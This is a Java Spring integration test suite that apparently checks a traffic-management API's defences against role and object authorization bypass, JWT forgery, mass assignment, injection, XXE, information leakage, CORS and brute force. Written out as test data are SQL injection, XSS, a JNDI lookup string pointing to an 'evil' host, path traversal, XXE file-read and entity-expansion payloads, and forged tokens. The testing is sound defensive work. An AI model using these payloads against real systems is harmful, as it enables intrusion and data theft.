package ar.edu.uade.transito.transito_backend.integration;

import static ar.edu.uade.transito.transito_backend.support.TestUsers.*;
import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Date;
import java.util.List;
import java.util.Set;
import java.util.UUID;
import java.util.stream.Stream;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;

import ar.edu.uade.transito.transito_backend.auth.AuthenticatedUser;
import ar.edu.uade.transito.transito_backend.model.enums.Role;
import ar.edu.uade.transito.transito_backend.support.AbstractIntegrationTest;
import ar.edu.uade.transito.transito_backend.support.Payloads;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.security.Keys;

/**
 * Evidencia de seguridad (Clase 15, eje D): autorización por rol (BFLA), acceso a datos ajenos (BOLA),
 * manipulación de JWT, mass assignment, inyección, XXE, fuga de información y controles de resiliencia.
 */
@DisplayName("Seguridad — evidencia de pruebas (Clase 15 §7)")
class SecurityEvidenceTests extends AbstractIntegrationTest {

    private static final String SECRET = "test-secret-key-with-at-least-thirty-two-bytes";
    private static final String ID = UUID.randomUUID().toString();
    private static final AuthenticatedUser[] ROLES = { INSPECTOR, ADMIN, CIUDADANO, AUDITOR };

    // ---------------------------------------------------------------- BFLA

    private record Ep(HttpMethod m, String path, Set<Role> allowed, String body, boolean strict) {
        @Override
        public String toString() {
            return m + " " + path;
        }
    }

    private static Ep ep(HttpMethod m, String p, String body, boolean strict, Role... allowed) {
        return new Ep(m, p, Set.of(allowed), body, strict);
    }

    private static final Role I = Role.INSPECTOR, A = Role.ADMINISTRADOR, C = Role.CIUDADANO, U = Role.AUDITOR;
    private static final String REASON = "{\"reason\":\"x\"}";

    static Stream<Ep> endpoints() {
        return Stream.of(
                ep(HttpMethod.POST, "/infractions", Payloads.infraction("30777888"), true, I),
                ep(HttpMethod.GET, "/infractions", null, true, I, A, U),
                ep(HttpMethod.GET, "/infractions/mine", null, true, C),
                ep(HttpMethod.GET, "/infractions/" + ID, null, true, I, A, C, U),
                ep(HttpMethod.PATCH, "/infractions/" + ID, Payloads.infractionUpdate(), true, I),
                ep(HttpMethod.POST, "/infractions/" + ID + "/appeal", REASON, true, C),
                ep(HttpMethod.POST, "/infractions/" + ID + "/confirmation", "{}", false, A),
                ep(HttpMethod.POST, "/infractions/" + ID + "/annulment", "{}", false, A),
                ep(HttpMethod.POST, "/parking-sessions", Payloads.session(ID), true, C, I),
                ep(HttpMethod.GET, "/parking-sessions", null, true, I, A, U),
                ep(HttpMethod.GET, "/parking-sessions/" + ID, null, true, I, C),
                ep(HttpMethod.POST, "/parking-sessions/" + ID + "/closure", null, true, C, I),
                ep(HttpMethod.POST, "/parking-sessions/" + ID + "/unpaid-flag", "{}", false, I),
                ep(HttpMethod.POST, "/parking-zones", Payloads.zone("Z"), true, A),
                ep(HttpMethod.PUT, "/parking-zones/" + ID, "{}", false, A),
                ep(HttpMethod.DELETE, "/parking-zones/" + ID, null, true, A),
                ep(HttpMethod.POST, "/parking-tariffs", Payloads.tariff(ID), true, A),
                ep(HttpMethod.PUT, "/parking-tariffs/" + ID, "{}", false, A),
                ep(HttpMethod.DELETE, "/parking-tariffs/" + ID, null, true, A),
                ep(HttpMethod.POST, "/accidents", Payloads.accident(), true, I),
                ep(HttpMethod.GET, "/accidents", null, true, I, A, U),
                ep(HttpMethod.GET, "/accidents/mine", null, true, C),
                ep(HttpMethod.GET, "/accidents/" + ID, null, true, I, A, U),
                ep(HttpMethod.PATCH, "/accidents/" + ID, Payloads.accidentUpdate("VERIFIED"), true, I),
                ep(HttpMethod.GET, "/street-closures", null, true, I, A, U),
                ep(HttpMethod.GET, "/street-closures/" + ID, null, true, I, A, U),
                ep(HttpMethod.POST, "/street-closures/" + ID + "/approval", "{}", false, A),
                ep(HttpMethod.POST, "/street-closures/" + ID + "/rejection", "{}", false, A),
                ep(HttpMethod.POST, "/street-closures/" + ID + "/activation", null, true, I),
                ep(HttpMethod.POST, "/street-closures/" + ID + "/completion", "{}", false, I),
                ep(HttpMethod.POST, "/operations", Payloads.operation(), true, I),
                ep(HttpMethod.GET, "/operations", null, true, I, A, U),
                ep(HttpMethod.GET, "/operations/" + ID, null, true, I, A, U),
                ep(HttpMethod.PATCH, "/operations/" + ID, "{}", false, I),
                ep(HttpMethod.POST, "/operations/" + ID + "/closure", "{}", false, I),
                ep(HttpMethod.POST, "/impoundments", Payloads.impoundment("30777888"), true, I),
                ep(HttpMethod.GET, "/impoundments", null, true, I, A, U),
                ep(HttpMethod.GET, "/impoundments/mine", null, true, C),
                ep(HttpMethod.GET, "/impoundments/" + ID, null, true, I, A, C, U),
                ep(HttpMethod.PATCH, "/impoundments/" + ID, "{}", false, A),
                ep(HttpMethod.POST, "/impoundments/" + ID + "/release", Payloads.release(), true, A));
    }

    @ParameterizedTest(name = "[{index}] {0}")
    @MethodSource("endpoints")
    @DisplayName("SEC-BFLA: cada endpoint rechaza a los roles no autorizados (403) y a quien no tiene token (401)")
    void forbiddenRolesAndAnonymous(Ep e) throws Exception {
        MvcResult anon = call(e.m(), e.path(), null, e.body()).andReturn();
        assertThat(anon.getResponse().getStatus()).as("sin token").isEqualTo(401);
        for (AuthenticatedUser u : ROLES) {
            if (e.allowed().contains(u.role())) {
                continue;
            }
            int s = call(e.m(), e.path(), u, e.body()).andReturn().getResponse().getStatus();
            if (e.strict()) {
                assertThat(s).as(e + " con rol " + u.role()).isEqualTo(403);
            } else {
                assertThat(s).as(e + " con rol " + u.role()).isBetween(400, 499).isNotIn(404);
            }
        }
    }

    // ---------------------------------------------------------------- BOLA

    @Test
    @DisplayName("SEC-BOLA-01: infracción — otro ciudadano no accede por id (403), no la ve en 'mine' y no puede apelarla")
    void bolaInfractions() throws Exception {
        String id = read(post("/infractions", INSPECTOR, Payloads.infraction(CIUDADANO.nationalId()))
                .andExpect(status().isCreated()).andReturn(), "$.infractionId");
        get("/infractions/" + id, CIUDADANO).andExpect(status().isOk());
        get("/infractions/" + id, OTRO_CIUDADANO).andExpect(status().isForbidden());
        post("/infractions/" + id + "/appeal", OTRO_CIUDADANO, REASON).andExpect(status().isForbidden());
        String mine = get("/infractions/mine", OTRO_CIUDADANO).andExpect(status().isOk()).andReturn().getResponse().getContentAsString();
        assertThat(mine).isEqualTo("[]");
    }

    @Test
    @DisplayName("SEC-BOLA-02: vehículo retenido — otro ciudadano no accede por id (403) ni lo ve en 'mine'")
    void bolaImpoundments() throws Exception {
        String id = read(post("/impoundments", INSPECTOR, Payloads.impoundment(CIUDADANO.nationalId()))
                .andExpect(status().isCreated()).andReturn(), "$.impoundmentId");
        get("/impoundments/" + id, CIUDADANO).andExpect(status().isOk());
        get("/impoundments/" + id, OTRO_CIUDADANO).andExpect(status().isForbidden());
        assertThat(get("/impoundments/mine", OTRO_CIUDADANO).andReturn().getResponse().getContentAsString()).isEqualTo("[]");
    }

    @Test
    @DisplayName("SEC-BOLA-03: accidentes — 'mine' de otro ciudadano no devuelve datos ajenos")
    void bolaAccidents() throws Exception {
        post("/accidents", INSPECTOR, Payloads.accident()).andExpect(status().isCreated());
        assertThat(get("/accidents/mine", OTRO_CIUDADANO).andReturn().getResponse().getContentAsString()).isEqualTo("[]");
    }

    @Test
    @DisplayName("SEC-BOLA-04: sesión de estacionamiento — un ciudadano distinto no debería leer ni cerrar la sesión de otro")
    void bolaParkingSession() throws Exception {
        String zone = read(post("/parking-zones", ADMIN, Payloads.zone("Z-BOLA")).andExpect(status().isCreated()).andReturn(), "$.zoneId");
        String sid = read(post("/parking-sessions", CIUDADANO, Payloads.session(zone)).andExpect(status().isCreated()).andReturn(), "$.sessionId");
        int read = get("/parking-sessions/" + sid, OTRO_CIUDADANO).andReturn().getResponse().getStatus();
        int close = post("/parking-sessions/" + sid + "/closure", OTRO_CIUDADANO, null).andReturn().getResponse().getStatus();
        System.out.println("EVIDENCIA BOLA-04 lectura=" + read + " cierre=" + close);
        assertThat(read).as("lectura de sesión ajena").isIn(403, 404);
        assertThat(close).as("cierre de sesión ajena").isIn(403, 404);
    }

    // ---------------------------------------------------------------- JWT

    private int getWith(String authorization) throws Exception {
        return mockMvc.perform(MockMvcRequestBuilders.get(API_PREFIX + "/infractions").header("Authorization", authorization))
                .andReturn().getResponse().getStatus();
    }

    private static String b64(String s) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(s.getBytes(StandardCharsets.UTF_8));
    }

    @Test
    @DisplayName("SEC-JWT-01: alg=none → 401")
    void algNone() throws Exception {
        String t = b64("{\"alg\":\"none\",\"typ\":\"JWT\"}") + "." + b64("{\"sub\":\"u-1002\",\"role\":\"ADMINISTRADOR\",\"nationalId\":\"1\"}") + ".";
        assertThat(getWith("Bearer " + t)).isEqualTo(401);
    }

    @Test
    @DisplayName("SEC-JWT-02: token vencido (firma válida) → 401")
    void expired() throws Exception {
        String t = Jwts.builder().subject("u-1002").claim("role", "ADMINISTRADOR").claim("nationalId", "1")
                .expiration(new Date(System.currentTimeMillis() - 60_000))
                .signWith(Keys.hmacShaKeyFor(SECRET.getBytes())).compact();
        assertThat(getWith("Bearer " + t)).isEqualTo(401);
    }

    @Test
    @DisplayName("SEC-JWT-03: firmado con otra clave → 401")
    void otherKey() throws Exception {
        String t = Jwts.builder().subject("u-1002").claim("role", "ADMINISTRADOR").claim("nationalId", "1")
                .signWith(Keys.hmacShaKeyFor("otra-clave-distinta-de-al-menos-32-bytes-xx".getBytes())).compact();
        assertThat(getWith("Bearer " + t)).isEqualTo(401);
    }

    @Test
    @DisplayName("SEC-JWT-04: payload alterado (CIUDADANO → ADMINISTRADOR) conservando la firma → 401")
    void tamperedPayload() throws Exception {
        String[] p = token(CIUDADANO).split("\\.");
        String payload = new String(Base64.getUrlDecoder().decode(p[1]), StandardCharsets.UTF_8).replace("CIUDADANO", "ADMINISTRADOR");
        assertThat(getWith("Bearer " + p[0] + "." + b64(payload) + "." + p[2])).isEqualTo(401);
    }

    @Test
    @DisplayName("SEC-JWT-05: cabecera Authorization vacía, sin Bearer o con token vacío → 401")
    void malformedHeaders() throws Exception {
        assertThat(getWith("Bearer ")).isEqualTo(401);
        assertThat(getWith("Basic abc")).isEqualTo(401);
        assertThat(getWith(token(ADMIN))).isEqualTo(401);
    }

    // ---------------------------------------------------------------- Mass assignment

    @Test
    @DisplayName("SEC-MA-01: campos no permitidos en el alta de infracción (status, id, importe) se ignoran")
    void massAssignmentInfraction() throws Exception {
        String normal = read(post("/infractions", INSPECTOR, Payloads.infraction("30777888")).andReturn(), "$.status");
        String forgedId = UUID.randomUUID().toString();
        String body = Payloads.infraction("30777888").replaceFirst("\\{", java.util.regex.Matcher.quoteReplacement("{\"status\":\"CONFIRMED\",\"infractionId\":\"" + forgedId + "\",\"confirmed\":true,"));
        MvcResult r = post("/infractions", INSPECTOR, body).andReturn();
        assertThat(r.getResponse().getStatus()).isIn(200, 201, 400);
        if (r.getResponse().getStatus() == 201) {
            assertThat(read(r, "$.status")).isEqualTo(normal);
            assertThat(read(r, "$.infractionId")).isNotEqualTo(forgedId);
        }
    }

    @Test
    @DisplayName("SEC-MA-02: sesión de estacionamiento — 'paid' y 'paymentReference' enviados por el cliente se ignoran")
    void massAssignmentSession() throws Exception {
        String zone = read(post("/parking-zones", ADMIN, Payloads.zone("Z-MA")).andReturn(), "$.zoneId");
        String body = Payloads.session(zone).replaceFirst("\\{", java.util.regex.Matcher.quoteReplacement("{\"paid\":true,\"paymentReference\":\"TRAMPA\","));
        MvcResult r = post("/parking-sessions", CIUDADANO, body).andReturn();
        if (r.getResponse().getStatus() == 201) {
            assertThat(read(r, "$.paid")).isEqualTo("false");
            assertThat(r.getResponse().getContentAsString()).doesNotContain("TRAMPA");
        }
    }

    @Test
    @DisplayName("SEC-MA-03: login con 'role' extra no escala privilegios")
    void loginRoleEscalation() throws Exception {
        MvcResult r = mockMvc.perform(MockMvcRequestBuilders.post(API_PREFIX + "/auth/login").contentType(MediaType.APPLICATION_JSON)
                .content("{\"username\":\"ciudadano1\",\"password\":\"test-ciudadano1-pass\",\"role\":\"ADMINISTRADOR\"}")).andReturn();
        assertThat(r.getResponse().getStatus()).isEqualTo(200);
        assertThat(read(r, "$.role")).isEqualTo("CIUDADANO");
    }

    // ---------------------------------------------------------------- Inyección / XSS

    static Stream<String> payloads() {
        return Stream.of("' OR '1'='1", "'; DROP TABLE infractions;--", "<script>alert(1)</script>",
                "\"><img src=x onerror=alert(1)>", "${jndi:ldap://evil/x}", "{\"$ne\":null}", "../../etc/passwd");
    }

    @ParameterizedTest(name = "[{index}] {0}")
    @MethodSource("payloads")
    @DisplayName("SEC-INJ-01: payloads SQL/NoSQL/XSS/JNDI en campos de texto → sin 5xx, sin ejecución, respuesta JSON y datos íntegros")
    void injection(String evil) throws Exception {
        String esc = evil.replace("\\", "\\\\").replace("\"", "\\\"");
        String body = Payloads.infraction("30777888").replace("AB123CD", esc);
        MvcResult c = post("/infractions", INSPECTOR, body).andReturn();
        assertThat(c.getResponse().getStatus()).isBetween(200, 499);
        assertThat(c.getResponse().getContentType()).startsWith("application/");
        String id = c.getResponse().getStatus() == 201 ? read(c, "$.infractionId") : null;
        long before = infractionRepository.count();
        MvcResult list = get("/infractions", ADMIN).andReturn();
        assertThat(list.getResponse().getStatus()).isEqualTo(200);
        assertThat(list.getResponse().getContentType()).startsWith("application/json");
        assertThat(infractionRepository.count()).isEqualTo(before);
        if (id != null) {
            post("/infractions/" + id + "/appeal", CIUDADANO, "{\"reason\":\"" + esc + "\"}");
        }
        int login = mockMvc.perform(MockMvcRequestBuilders.post(API_PREFIX + "/auth/login").contentType(MediaType.APPLICATION_JSON)
                .content("{\"username\":\"" + esc + "\",\"password\":\"" + esc + "\"}")).andReturn().getResponse().getStatus();
        assertThat(login).as("login con payload malicioso").isIn(400, 401);
        assertThat(parkingZoneRepository.count()).isGreaterThanOrEqualTo(0);
    }

    // ---------------------------------------------------------------- XXE

    @ParameterizedTest
    @ValueSource(strings = {
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body><a>&xxe;</a></soapenv:Body></soapenv:Envelope>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % r SYSTEM \"http://127.0.0.1:1/x\"> %r;]><x/>",
            "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY a \"aaaaaaaaaa\"><!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;\">]><lolz>&b;&b;&b;&b;</lolz>" })
    @DisplayName("SEC-XXE-01: SOAP con DOCTYPE/entidades externas → no se resuelve ni se filtra contenido, sin stack trace")
    void xxe(String xml) throws Exception {
        MvcResult r = mockMvc.perform(MockMvcRequestBuilders.post("/soap/authentication").contentType("text/xml").content(xml)).andReturn();
        String out = r.getResponse().getContentAsString();
        System.out.println("EVIDENCIA XXE status=" + r.getResponse().getStatus());
        assertThat(out).doesNotContain("root:").doesNotContain("/bin/bash").doesNotContain("aaaaaaaaaaaaaaaaaaaa");
        assertThat(out).doesNotContain("at java.").doesNotContain("at org.");
        assertThat(r.getResponse().getStatus()).isLessThan(500);
    }

    // ---------------------------------------------------------------- Fuga de información / headers

    @Test
    @DisplayName("SEC-ERR-01: errores (JSON malformado, tipo inválido, id inexistente, método no permitido) sin stack trace ni SQL")
    void errorsDoNotLeak() throws Exception {
        List<MvcResult> rs = List.of(
                post("/infractions", INSPECTOR, "{no es json").andReturn(),
                post("/infractions", INSPECTOR, "{\"licensePlate\":123,\"infractionDateTime\":\"ayer\"}").andReturn(),
                get("/infractions/" + ID, ADMIN).andReturn(),
                get("/infractions/no-es-uuid", ADMIN).andReturn(),
                call(HttpMethod.DELETE, "/infractions/" + ID, ADMIN, null).andReturn());
        for (MvcResult r : rs) {
            String b = r.getResponse().getContentAsString();
            assertThat(r.getResponse().getStatus()).as(b).isBetween(400, 499);
            assertThat(b).doesNotContain("Exception").doesNotContain("\tat ").doesNotContain("org.springframework")
                    .doesNotContain("org.hibernate").doesNotContain("SQL").doesNotContain("ar.edu.uade");
        }
    }

    @Test
    @DisplayName("SEC-HDR-01: cabeceras de seguridad básicas en las respuestas")
    void securityHeaders() throws Exception {
        MvcResult r = mockMvc.perform(MockMvcRequestBuilders.get("/actuator/health")).andReturn();
        System.out.println("EVIDENCIA HEADERS " + r.getResponse().getHeaderNames().stream()
                .map(h -> h + "=" + r.getResponse().getHeader(h)).toList());
        assertThat(r.getResponse().getHeader("X-Content-Type-Options")).isEqualTo("nosniff");
        assertThat(r.getResponse().getHeader("X-Frame-Options")).isNotNull();
        assertThat(r.getResponse().getHeader("Cache-Control")).contains("no-cache");
    }

    @Test
    @DisplayName("SEC-HDR-02: CSP presente (hallazgo informativo)")
    void csp() throws Exception {
        MvcResult r = mockMvc.perform(MockMvcRequestBuilders.get("/actuator/health")).andReturn();
        assertThat(r.getResponse().getHeader("Content-Security-Policy")).isNotNull();
    }

    @Test
    @DisplayName("SEC-ACT-01: endpoints sensibles de actuator no son públicos")
    void actuatorLocked() throws Exception {
        for (String p : List.of("/actuator/env", "/actuator/beans", "/actuator/heapdump", "/actuator/configprops", "/actuator/mappings")) {
            int s = mockMvc.perform(MockMvcRequestBuilders.get(p)).andReturn().getResponse().getStatus();
            assertThat(s).as(p).isIn(401, 403, 404);
        }
        String health = mockMvc.perform(MockMvcRequestBuilders.get("/actuator/health")).andReturn().getResponse().getContentAsString();
        assertThat(health).doesNotContain("jdbc").doesNotContain("password").doesNotContain("url");
    }

    @Test
    @DisplayName("SEC-CORS-01: origen no permitido no recibe Access-Control-Allow-Origin ni comodín con credenciales")
    void corsEvil() throws Exception {
        MvcResult r = mockMvc.perform(MockMvcRequestBuilders.options(API_PREFIX + "/infractions").header("Origin", "https://evil.example")
                .header("Access-Control-Request-Method", "GET")).andReturn();
        assertThat(r.getResponse().getHeader("Access-Control-Allow-Origin")).isNull();
        MvcResult ok = mockMvc.perform(MockMvcRequestBuilders.get(API_PREFIX + "/infractions").header("Origin", "https://evil.example")
                .header("Authorization", "Bearer " + token(ADMIN))).andReturn();
        assertThat(ok.getResponse().getHeader("Access-Control-Allow-Origin")).isNull();
    }

    @Tag("bug")
    @Test
    @DisplayName("SEC-DATA-01: el JWT no transporta datos personales (DNI) — minimización")
    void jwtHasNoPii() throws Exception {
        String payload = new String(Base64.getUrlDecoder().decode(token(CIUDADANO).split("\\.")[1]), StandardCharsets.UTF_8);
        System.out.println("EVIDENCIA JWT payload=" + payload);
        assertThat(payload).doesNotContain(CIUDADANO.nationalId());
    }

    // ---------------------------------------------------------------- Resiliencia REST

    @Test
    @DisplayName("SEC-BF-01: fuerza bruta sobre login → bloqueo/429 tras N intentos fallidos")
    void bruteForce() throws Exception {
        boolean limited = false;
        for (int i = 0; i < 40 && !limited; i++) {
            limited = mockMvc.perform(MockMvcRequestBuilders.post(API_PREFIX + "/auth/login").contentType(MediaType.APPLICATION_JSON)
                    .content("{\"username\":\"ciudadano1\",\"password\":\"mala" + i + "\"}")).andReturn().getResponse().getStatus() == 429;
        }
        assertThat(limited).as("se devolvió 429 en algún intento").isTrue();
    }

    @Test
    @DisplayName("REST-IDEM-01: POST repetido con la misma Idempotency-Key crea un único recurso")
    void idempotency() throws Exception {
        String key = UUID.randomUUID().toString();
        for (int i = 0; i < 2; i++) {
            mockMvc.perform(MockMvcRequestBuilders.post(API_PREFIX + "/infractions").header("Authorization", "Bearer " + token(INSPECTOR))
                    .header("Idempotency-Key", key).contentType(MediaType.APPLICATION_JSON).content(Payloads.infraction("30777888")));
        }
        assertThat(infractionRepository.count()).isEqualTo(1);
    }

    @Test
    @DisplayName("REST-ETAG-01: GET devuelve ETag (el 412 se prueba contra servidor real en EtagServerTest)")
    void etag() throws Exception {
        String id = read(post("/infractions", INSPECTOR, Payloads.infraction("30777888")).andReturn(), "$.infractionId");
        String etag = get("/infractions/" + id, INSPECTOR).andReturn().getResponse().getHeader("ETag");
        assertThat(etag).isNotNull();
    }

    @Test
    @DisplayName("SEC-HDR-03: HSTS presente sobre HTTPS")
    void hsts() throws Exception {
        MvcResult r = mockMvc.perform(MockMvcRequestBuilders.get("/actuator/health").secure(true)).andReturn();
        assertThat(r.getResponse().getHeader("Strict-Transport-Security")).contains("max-age=31536000");
    }

    @Test
    @DisplayName("REST-ETAG-02: If-None-Match con el ETag vigente → 304")
    void notModified() throws Exception {
        String id = read(post("/infractions", INSPECTOR, Payloads.infraction("30777888")).andReturn(), "$.infractionId");
        String etag = get("/infractions/" + id, INSPECTOR).andReturn().getResponse().getHeader("ETag");
        int s = mockMvc.perform(MockMvcRequestBuilders.get(API_PREFIX + "/infractions/" + id)
                .header("Authorization", "Bearer " + token(INSPECTOR)).header("If-None-Match", etag)).andReturn().getResponse().getStatus();
        assertThat(s).isEqualTo(304);
    }

    @Test
    @DisplayName("REST-ERR-01: formato Problem Details en 400/401/403/404/409")
    void problemDetails() throws Exception {
        String id = read(post("/infractions", INSPECTOR, Payloads.infraction("30777888")).andReturn(), "$.infractionId");
        List<MvcResult> rs = List.of(
                post("/infractions", INSPECTOR, "{}").andReturn(),
                get("/infractions", null).andReturn(),
                get("/infractions", CIUDADANO).andReturn(),
                get("/infractions/" + ID, ADMIN).andReturn(),
                post("/infractions/" + id + "/annulment", ADMIN, "{}").andReturn());
        int[] expected = { 400, 401, 403, 404 };
        for (int i = 0; i < 4; i++) {
            assertThat(rs.get(i).getResponse().getStatus()).isEqualTo(expected[i]);
        }
        for (MvcResult r : rs.subList(0, 4)) {
            String b = r.getResponse().getContentAsString();
            assertThat(b).contains("\"status\"");
            assertThat(b).containsAnyOf("\"detail\"", "\"message\"", "\"title\"");
        }
    }
}
